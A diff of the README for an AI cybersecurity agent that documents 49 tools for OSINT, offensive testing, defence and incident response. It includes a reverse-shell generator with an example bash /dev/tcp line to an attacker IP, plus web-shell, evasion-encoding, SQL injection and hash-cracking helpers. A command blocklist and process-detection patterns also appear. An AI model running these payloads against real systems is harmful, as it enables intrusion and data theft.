@@ -1,273 +1,830 @@
 # Zuck - AI Cybersecurity Agent
 
-A modular, cybersecurity-focused AI assistant powered by **LangChain** with support for multiple LLM providers (Google Gemini, OpenAI, Anthropic Claude, Ollama). This project provides an interactive terminal interface for cybersecurity and system administration tasks on Linux systems.
+A comprehensive, modular AI-powered cybersecurity assistant with **49 built-in tools** for offensive security, defensive analysis, OSINT, forensics, and more. Powered by **LangChain** with support for multiple LLM providers.
 
 ## Features
 
-- **Multi-Provider LLM Support**: Easily switch between Google Gemini, OpenAI, Anthropic, or local Ollama models
-- **AI-Powered Command Generation**: Suggests terminal commands for cybersecurity tasks
-- **Modular Architecture**: Clean package structure with separation of concerns
-- **10 Built-in Security Tools**: Calculator, VirusTotal, DNS, WHOIS, HTTP, file reader, and more
-- **Safety Measures**: Includes command blocklisting and validation to prevent destructive operations
-- **Interactive Interface**: Continuous conversation flow with command execution feedback
-- **Token Tracking**: Monitor API usage and costs across all providers
-- **Comprehensive Logging**: Detailed session logs and analytics
-
-## Project Structure
-
-```
-zuck/
-├── core/           # Agent orchestration, config, models
-├── llm/            # LLM provider abstraction (Google, OpenAI, Anthropic, Ollama)
-├── tools/          # 10 individual security tools
-├── security/       # Command validation and security patterns
-├── execution/      # Shell command execution
-├── utils/          # Logging, tracking, system info
-└── cli/            # Interactive REPL interface
-```
-
-## Prerequisites
-
-- Python 3.8 or higher
-- Google API key for Gemini (<https://ai.google.dev/>) (or other provider API keys)
-- Linux-based operating system (will work in macOS and Windows with adjustment)
-- The following cybersecurity tools (for full functionality):
-  - NMAP
-  - WHOIS
-  - TCPDUMP
-  - TSHARK
-  - NETCAT
-  - DNSUTILS
-  - AIRCRACK-NG
-
-## Installation
-
-1. Clone this repository:
-
-   ```bash
-   git clone https://github.com/adityasasidhar/Zuck-your-very-own-AI-hacker-buddy.git
-   cd Zuck-your-very-own-AI-hacker-buddy
-   ```
-
-2. Create and activate a virtual environment:
-
-   ```bash
-   python -m venv .venv
-   source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-   ```
-
-3. Install required Python packages:
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-4. Create an API key file:
-
-   ```bash
-   echo "YOUR_GOOGLE_API_KEY" > apikey.txt
-   ```
-
-   Replace `YOUR_GOOGLE_API_KEY` with your actual Google Gemini API key.
+- **49 Security Tools**: OSINT, offensive, defensive, forensics, playbooks
+- **Multi-Provider LLM**: Google Gemini, OpenAI, Anthropic, Ollama
+- **Automated Playbooks**: Recon, web pentest, incident response
+- **Knowledge Base**: MITRE ATT&CK, OWASP Top 10 references
+- **Modular Architecture**: Easy to extend with new tools
 
 ## Quick Start
 
-### Running the Agent
-
 ```bash
-# Standard way
+# Install
+git clone https://github.com/adityasasidhar/Zuck-your-very-own-AI-hacker-buddy.git
+cd Zuck-your-very-own-AI-hacker-buddy
+pip install -r requirements.txt
+echo "YOUR_API_KEY" > apikey.txt
+
+# Run
 python main.py
-
-# As a Python module
-python -m zuck
-
-# With custom options
-python -m zuck --provider google --model gemini-2.5-flash --temp 0.3
+# or
+python -m zuck --provider google --model gemini-2.5-flash
 ```
 
-### Command Line Options
+---
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--provider` | LLM provider (google, openai, anthropic, ollama) | google |
-| `--model` | Model name | gemini-2.5-flash |
-| `--temp` | Temperature (0.0-2.0) | 0.3 |
-| `--max-commands` | Max commands per session | 50 |
+# 📚 Tool Documentation
 
-## Using as a Library
+## Table of Contents
+- [Original Tools](#original-tools)
+- [OSINT & Reconnaissance](#osint--reconnaissance)
+- [Offensive Security](#offensive-security)
+- [Defensive Security](#defensive-security)
+- [Playbooks](#playbooks)
+- [Knowledge Base](#knowledge-base)
 
+---
+
+## Original Tools
+
+### `calculator`
+**Purpose**: Network and mathematical calculations.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `expression` | str | Mathematical or network expression |
+
+**Capabilities**:
+- Basic math: `2+2`, `10*5`, `100/4`
+- Subnet calculations: `192.168.1.0/24 size`
+- Hex/decimal: `0xFF to decimal`, `255 to hex`
+- Binary: `0b11111111 to decimal`
+
+**Examples**:
 ```python
-from zuck import ZuckAgent, AgentConfig
+calculator("192.168.1.0/24 size")
+# Returns: network, netmask, broadcast, usable hosts
 
-# Create configuration
-config = AgentConfig(
-    provider="google",
-    model_name="gemini-2.5-flash",
-    temperature=0.3
-)
-
-# Initialize and run
-agent = ZuckAgent(config)
-agent.run()
+calculator("0xFF to decimal")
+# Returns: 255
 ```
 
-### Using Individual Components
+---
 
+### `virustotal_lookup`
+**Purpose**: Check file hashes, URLs, domains, or IPs against VirusTotal.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `resource` | str | required | Hash, URL, domain, or IP |
+| `resource_type` | str | "auto" | Type: hash, url, domain, ip, auto |
+
+**Requires**: `virustotalapikey.txt` with your VT API key.
+
+**Examples**:
 ```python
-# Use the LLM provider directly
-from zuck.llm import create_provider
-from zuck.core.config import AgentConfig
-
-config = AgentConfig(provider="google")
-provider = create_provider(config)
-
-# Use tools
-from zuck.tools import get_all_tools, get_tool_by_name
-
-tools = get_all_tools()
-calculator = get_tool_by_name("calculator")
-result = calculator.invoke({"expression": "192.168.1.0/24 size"})
+virustotal_lookup("44d88612fea8a8f36de82e1278abb02f", "hash")
+virustotal_lookup("google.com", "domain")
+virustotal_lookup("8.8.8.8", "ip")
 ```
 
-## LLM Provider Configuration
+**Returns**: Malicious/suspicious counts, reputation score, last analysis date.
 
-### Google Gemini (Default)
+---
 
-```bash
-echo "YOUR_GOOGLE_API_KEY" > apikey.txt
-python main.py
-```
+### `datetime_tool`
+**Purpose**: Parse timestamps and calculate time differences.
 
-### OpenAI
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `operation` | str | now, parse, diff |
+| `timestamp` | str | Timestamp to parse (optional) |
+| `timezone_str` | str | Timezone (default: UTC) |
 
+**Examples**:
 ```python
-config = AgentConfig(
-    provider="openai",
-    model_name="gpt-4",
-    openai_api_key="sk-..."  # or set OPENAI_API_KEY env var
-)
+datetime_tool("now")  # Current UTC time
+datetime_tool("parse", "2024-01-15 10:30:00")
+datetime_tool("diff", "2024-01-15 10:00:00")  # Time since
 ```
 
-### Anthropic Claude
+---
 
+### `memory_store`
+**Purpose**: Store and retrieve findings during the session.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `action` | str | store, retrieve, list, clear |
+| `key` | str | Storage key |
+| `value` | str | Value to store |
+
+**Examples**:
 ```python
-config = AgentConfig(
-    provider="anthropic",
-    model_name="claude-3-5-sonnet-20241022",
-    anthropic_api_key="sk-ant-..."  # or set ANTHROPIC_API_KEY env var
-)
+memory_store("store", "target_ip", "192.168.1.100")
+memory_store("retrieve", "target_ip")
+memory_store("list")  # Show all keys
 ```
 
-### Ollama (Local)
+---
 
+### `read_file`
+**Purpose**: Safely read files with security restrictions.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `filepath` | str | required | Path to file |
+| `max_lines` | int | 100 | Maximum lines to read |
+
+**Security**: Blocks `/etc/shadow`, `/etc/gshadow`, `/root/.ssh`. Max 10MB.
+
+**Examples**:
 ```python
-config = AgentConfig(
-    provider="ollama",
-    model_name="llama3.1"  # No API key needed!
-)
+read_file("/etc/hosts")
+read_file("/var/log/syslog", max_lines=50)
 ```
 
-## Built-in Tools
+---
 
-| Tool | Description |
-|------|-------------|
-| `calculator` | Network calculations (subnet size, IP ranges, hex/decimal) |
-| `virustotal_lookup` | Check file hashes, URLs, domains, IPs for malware |
-| `datetime_tool` | Parse timestamps, analyze log times |
-| `memory_store` | Store and retrieve findings during session |
-| `read_file` | Read configuration files and logs safely |
-| `http_request` | Make HTTP requests to test APIs |
-| `dns_lookup` | Query DNS records (A, MX, TXT, NS, etc.) |
-| `whois_lookup` | Get domain registration information |
-| `python_repl` | Execute Python code for data analysis |
-| `wikipedia_search` | Look up security concepts and protocols |
+### `http_request`
+**Purpose**: Make HTTP requests and analyze responses.
 
-## How It Works
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `url` | str | required | Target URL |
+| `method` | str | "GET" | HTTP method |
+| `headers` | str | None | JSON string of headers |
 
-1. The assistant receives your query about a cybersecurity or system administration task
-2. It generates an appropriate terminal command or uses a built-in tool
-3. Commands are displayed for your approval
-4. Upon confirmation, the command is executed
-5. The output is fed back to the assistant for further analysis
-6. The conversation continues with additional commands as needed
-
-## Analytics
-
-### View analytics for latest session
-
-```bash
-python analytics.py --latest
-```
-
-### List all sessions
-
-```bash
-python analytics.py --list
-```
-
-### Generate report for specific session
-
-```bash
-python analytics.py --report 20241018_143022
-```
-
-### Compare multiple sessions
-
-```bash
-python analytics.py --compare 20241018_143022 20241018_150134
-```
-
-## Safety Features
-
-- **Critical Command Blocking**: Prevents destructive operations (rm -rf /, mkfs, dd to devices)
-- **High-Risk Warnings**: Extra confirmation for shutdown, reboot, firewall changes
-- **Human Oversight**: All commands require user approval before execution
-- **Secure File Access**: Blocks reading sensitive files like /etc/shadow
-
-## Adding New Tools
-
-Create a new file in `zuck/tools/`:
-
+**Examples**:
 ```python
-# zuck/tools/my_tool.py
-from langchain.tools import tool
-
-@tool
-def my_tool(input: str) -> str:
-    """Description of what your tool does."""
-    # Tool implementation
-    return result
+http_request("https://example.com")
+http_request("https://api.example.com", "POST", '{"Content-Type": "application/json"}')
 ```
 
-Then add it to `zuck/tools/registry.py`.
+**Returns**: Status code, headers, content preview.
 
-## Adding New LLM Providers
+---
 
-Create a new file in `zuck/llm/`:
+### `dns_lookup`
+**Purpose**: Query DNS records.
 
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `domain` | str | required | Domain to query |
+| `record_type` | str | "A" | A, AAAA, MX, TXT, NS, CNAME, SOA |
+
+**Examples**:
 ```python
-# zuck/llm/my_provider.py
-from zuck.llm.base import BaseLLMProvider, LLMResponse
-
-class MyProvider(BaseLLMProvider):
-    def invoke(self, messages):
-        # Implementation
-        return LLMResponse(content=..., tool_calls=...)
-    
-    def bind_tools(self, tools):
-        # Implementation
-        pass
+dns_lookup("google.com", "A")
+dns_lookup("example.com", "MX")
+dns_lookup("example.com", "TXT")
 ```
 
-Then add it to `zuck/llm/factory.py`.
+---
 
-## Limitations
+### `whois_lookup`
+**Purpose**: Get domain registration information.
 
-- Requires internet connection for API access (except Ollama)
-- Some suggested commands may require sudo privileges
-- Limited to the pre-installed cybersecurity tools
-- Designed primarily for Linux environments
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `domain` | str | Domain to look up |
+
+**Returns**: Registrar, creation/expiration dates, name servers, emails.
+
+---
+
+### `python_repl`
+**Purpose**: Execute Python code for data analysis.
+
+**Usage**: Pass valid Python code. Returns execution output.
+
+**Warning**: Executes arbitrary Python. Use with caution.
+
+---
+
+### `wikipedia_search`
+**Purpose**: Look up security concepts on Wikipedia.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `query` | str | required | Search query |
+| `sentences` | int | 3 | Sentences to return |
+
+**Examples**:
+```python
+wikipedia_search("SQL injection")
+wikipedia_search("TLS protocol")
+```
+
+---
+
+## OSINT & Reconnaissance
+
+### `shodan_host_lookup`
+**Purpose**: Get detailed information about an IP from Shodan.
+
+**Requires**: `shodanapikey.txt`
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `ip` | str | IP address to look up |
+
+**Returns**:
+- Hostnames, country, city, organization
+- Open ports and services
+- Known vulnerabilities (CVEs)
+- Service banners
+
+**Example**:
+```python
+shodan_host_lookup("8.8.8.8")
+```
+
+---
+
+### `shodan_search`
+**Purpose**: Search Shodan for hosts matching criteria.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `query` | str | required | Shodan search query |
+| `limit` | int | 10 | Max results |
+
+**Query Examples**:
+- `nginx country:US` - Nginx servers in US
+- `port:3389 os:windows` - Windows RDP
+- `vuln:CVE-2021-44228` - Log4Shell vulnerable
+
+---
+
+### `find_subdomains`
+**Purpose**: Discover subdomains via certificate transparency (crt.sh).
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `domain` | str | Target domain |
+
+**How it works**: Queries crt.sh for SSL certificates issued for the domain, extracting all subdomains from certificate SAN fields.
+
+**Example**:
+```python
+find_subdomains("google.com")
+# Returns: mail.google.com, drive.google.com, etc.
+```
+
+---
+
+### `dns_subdomain_bruteforce`
+**Purpose**: Discover subdomains through DNS resolution.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `domain` | str | required | Target domain |
+| `wordlist` | str | "common" | common (50) or extended (200) |
+
+**How it works**: Attempts DNS resolution for common subdomain names like www, mail, api, dev, staging, etc.
+
+---
+
+### `ip_geolocation`
+**Purpose**: Get geolocation and network info for an IP.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `ip` | str | IP address |
+
+**Returns**:
+- Country, region, city, coordinates
+- ISP, organization, ASN
+- Flags: is_mobile, is_proxy, is_hosting
+
+**API**: Uses ip-api.com (free, no key required).
+
+---
+
+### `bulk_ip_lookup`
+**Purpose**: Look up multiple IPs at once.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `ips` | str | Comma-separated IPs (max 10) |
+
+**Example**:
+```python
+bulk_ip_lookup("8.8.8.8,1.1.1.1,4.4.4.4")
+```
+
+---
+
+### `username_search`
+**Purpose**: Check if a username exists across 30+ platforms.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `username` | str | Username to search |
+
+**Platforms checked**: GitHub, Twitter, Instagram, LinkedIn, Reddit, Medium, dev.to, GitLab, TikTok, YouTube, Twitch, etc.
+
+**How it works**: Makes parallel HTTP requests to each platform's profile URL and checks response status.
+
+---
+
+### `email_osint`
+**Purpose**: Investigate an email address.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `email` | str | Email to investigate |
+
+**Returns**:
+- Username and domain extraction
+- MX records for domain
+- Free provider detection (gmail, yahoo, etc.)
+- Disposable email detection
+
+---
+
+## Offensive Security
+
+### `cve_lookup`
+**Purpose**: Get detailed CVE information from NVD.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `cve_id` | str | CVE ID (e.g., CVE-2021-44228) |
+
+**Returns**:
+- Description, published date
+- CVSS score and severity
+- Vector string
+- Weaknesses (CWE)
+- References
+
+**Example**:
+```python
+cve_lookup("CVE-2021-44228")  # Log4Shell
+cve_lookup("CVE-2017-0144")   # EternalBlue
+```
+
+---
+
+### `search_exploits`
+**Purpose**: Search ExploitDB for exploits.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `query` | str | required | Search query |
+| `limit` | int | 10 | Max results |
+
+**Example**:
+```python
+search_exploits("apache 2.4")
+search_exploits("wordpress 5.0")
+```
+
+---
+
+### `exploit_info`
+**Purpose**: Get details about a specific ExploitDB exploit.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `exploit_id` | str | ExploitDB ID |
+
+**Returns**: Direct URLs to view, download, and raw exploit code.
+
+---
+
+### `generate_reverse_shell`
+**Purpose**: Generate reverse shell payloads.
+
+**⚠️ WARNING**: For authorized testing only!
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `shell_type` | str | bash, python, php, perl, ruby, nc, powershell, etc. |
+| `ip` | str | Attacker IP |
+| `port` | int | Listening port |
+
+**Supported shells**: bash, bash_udp, sh, python, python3, php, php_exec, perl, ruby, nc, nc_mkfifo, ncat, powershell, socat, awk
+
+**Example**:
+```python
+generate_reverse_shell("bash", "10.10.10.1", 4444)
+# Returns: bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
+```
+
+---
+
+### `encode_payload`
+**Purpose**: Encode payloads for evasion.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `payload` | str | required | Payload to encode |
+| `encoding` | str | "base64" | base64, url, hex, unicode, html |
+
+**Example**:
+```python
+encode_payload("whoami", "base64")
+# Returns: d2hvYW1p
+```
+
+---
+
+### `generate_webshell`
+**Purpose**: Generate web shell payloads.
+
+**⚠️ WARNING**: For authorized testing only!
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `shell_type` | str | required | php, asp, aspx, jsp |
+| `password` | str | "" | Optional password protection |
+
+---
+
+### `identify_hash`
+**Purpose**: Identify hash type and get cracking commands.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `hash_value` | str | Hash to identify |
+
+**Detects**: MD5, SHA1, SHA256, SHA512, NTLM, bcrypt, MySQL, Unix crypt variants, LM, Cisco types
+
+**Returns**:
+- Possible hash types
+- Hashcat mode number
+- John the Ripper format
+- Example cracking commands
+
+---
+
+### `hash_string`
+**Purpose**: Generate hash of a string.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `text` | str | required | Text to hash |
+| `algorithm` | str | "md5" | md5, sha1, sha256, sha512, blake2b |
+
+---
+
+### `generate_wordlist_command`
+**Purpose**: Generate wordlist creation commands.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `target_info` | str | Target info (company, location, etc.) |
+
+**Returns**: Commands for cewl, crunch, cupp, john rules, plus common wordlist paths.
+
+---
+
+### `port_scan`
+**Purpose**: Python-native TCP port scanner.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `target` | str | required | IP or hostname |
+| `ports` | str | "common" | common, top100, 1-1000, or 80,443,8080 |
+| `timeout` | float | 1.0 | Connection timeout |
+
+**How it works**: Uses Python sockets with parallel threading (50 workers). Identifies services from common port mappings.
+
+**Example**:
+```python
+port_scan("192.168.1.1")           # Top 25 ports
+port_scan("10.0.0.1", "top100")    # Top 100 ports
+port_scan("example.com", "22,80,443,3389")
+```
+
+---
+
+### `banner_grab`
+**Purpose**: Grab service banner from a port.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `target` | str | required | IP or hostname |
+| `port` | int | required | Port number |
+| `timeout` | float | 3.0 | Timeout |
+
+---
+
+### `ping_sweep`
+**Purpose**: Discover live hosts in a network.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `network` | str | CIDR notation (e.g., 192.168.1.0/24) |
+
+**How it works**: Attempts TCP connections to common ports (80, 443, 22, 445) on each host. Uses parallel scanning.
+
+**Limit**: Maximum /24 (256 hosts).
+
+---
+
+### `sqli_payloads`
+**Purpose**: Get SQL injection payloads.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `payload_type` | str | "basic" | basic, union, blind, error, all |
+
+---
+
+### `generate_sqlmap_command`
+**Purpose**: Generate sqlmap commands.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `url` | str | required | Target URL |
+| `mode` | str | "basic" | basic, aggressive, dump |
+
+---
+
+## Defensive Security
+
+### `analyze_auth_log`
+**Purpose**: Analyze authentication logs for security events.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `filepath` | str | /var/log/auth.log | Log file path |
+| `lines` | int | 500 | Lines to analyze |
+
+**Detects**:
+- Failed login attempts
+- Successful logins
+- Sudo commands
+- Brute force attempts (>5 failures from same IP)
+
+---
+
+### `analyze_web_log`
+**Purpose**: Analyze web server logs for attacks.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `filepath` | str | Path to access log |
+| `lines` | int | Lines to analyze (default 500) |
+
+**Detects**:
+- SQL injection attempts
+- XSS attempts
+- Path traversal
+- Command injection
+
+---
+
+### `search_logs`
+**Purpose**: Search logs for patterns.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `pattern` | str | required | Regex pattern |
+| `log_path` | str | /var/log | Directory to search |
+| `file_pattern` | str | *.log | File glob |
+
+---
+
+### `analyze_processes`
+**Purpose**: Detect suspicious running processes.
+
+**Arguments**: None (analyzes current system)
+
+**Detects**:
+- High CPU/memory usage
+- Suspicious patterns: netcat, base64 decode pipes, /tmp execution, crypto miners
+- Processes running from unusual locations
+
+---
+
+### `analyze_connections`
+**Purpose**: Monitor network connections.
+
+**Arguments**: None
+
+**Returns**:
+- Listening ports
+- Established connections
+- Suspicious port usage (4444, 5555, 1337, etc.)
+
+---
+
+### `check_open_ports`
+**Purpose**: List all open listening ports.
+
+**Arguments**: None
+
+**Returns**: Port number, bind address, process info.
+
+---
+
+### `extract_iocs`
+**Purpose**: Extract IOCs from text.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `text` | str | Text to analyze |
+
+**Extracts**:
+- IPv4/IPv6 addresses
+- Domains and URLs
+- Email addresses
+- MD5, SHA1, SHA256 hashes
+- Bitcoin addresses
+- CVE identifiers
+
+---
+
+### `extract_iocs_from_file`
+**Purpose**: Extract IOCs from a file.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `filepath` | str | Path to file |
+
+---
+
+### `analyze_file_hashes`
+**Purpose**: Calculate file hashes for malware analysis.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `filepath` | str | Path to file |
+
+**Returns**: MD5, SHA1, SHA256 hashes, plus VirusTotal URL for lookup.
+
+---
+
+### `analyze_ssl`
+**Purpose**: Analyze SSL/TLS configuration.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `hostname` | str | required | Target hostname |
+| `port` | int | 443 | Port number |
+
+**Returns**:
+- TLS version and cipher suite
+- Certificate details (subject, issuer, validity)
+- Days until expiration
+- Security warnings
+
+---
+
+### `analyze_security_headers`
+**Purpose**: Audit HTTP security headers.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `url` | str | URL to analyze |
+
+**Checks**:
+- Strict-Transport-Security (HSTS)
+- Content-Security-Policy (CSP)
+- X-Frame-Options
+- X-Content-Type-Options
+- X-XSS-Protection
+
+**Returns**: Score (0-5), each header's value, and recommendations.
+
+---
+
+## Playbooks
+
+### `run_recon_playbook`
+**Purpose**: Automated reconnaissance workflow.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `target` | str | required | Target domain or IP |
+| `depth` | str | "basic" | basic, standard, deep |
+
+**Phases**:
+1. DNS & WHOIS lookup
+2. Subdomain enumeration
+3. Port scanning
+4. SSL/TLS analysis (standard+)
+5. Security headers (standard+)
+
+---
+
+### `run_web_pentest`
+**Purpose**: Web application testing workflow.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `url` | str | required | Target URL |
+| `scope` | str | "passive" | passive, active |
+
+**Phases**:
+1. HTTP analysis
+2. Security headers
+3. Technology detection
+4. Recommendations (nikto, sqlmap, etc.)
+
+---
+
+### `run_ir_playbook`
+**Purpose**: Incident response workflow.
+
+**Arguments**:
+| Arg | Type | Default | Description |
+|-----|------|---------|-------------|
+| `incident_type` | str | "general" | general, malware, intrusion, data_breach |
+
+**Phases**:
+1. Process analysis
+2. Network connection analysis
+3. Auth log analysis
+4. IOC collection
+5. Type-specific recommendations
+
+---
+
+## Knowledge Base
+
+### `get_attack_technique`
+**Purpose**: MITRE ATT&CK technique lookup.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `technique_id` | str | MITRE ID (e.g., T1059) |
+
+**Returns**: Name, tactic, description, subtechniques, mitigations.
+
+---
+
+### `search_techniques`
+**Purpose**: Search ATT&CK techniques by keyword.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `keyword` | str | Search term |
+
+---
+
+### `get_owasp_info`
+**Purpose**: OWASP Top 10 reference.
+
+**Arguments**:
+| Arg | Type | Description |
+|-----|------|-------------|
+| `category` | str | A01-A10 or keyword (e.g., "injection") |
+
+**Returns**: Category name, description, examples, prevention measures.
+
+---
+
+## API Keys
+
+| Service | File | Required For |
+|---------|------|--------------|
+| Google Gemini | `apikey.txt` | LLM (default) |
+| Shodan | `shodanapikey.txt` | shodan_* tools |
+| VirusTotal | `virustotalapikey.txt` | virustotal_lookup |
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+MIT License - see [LICENSE](LICENSE)
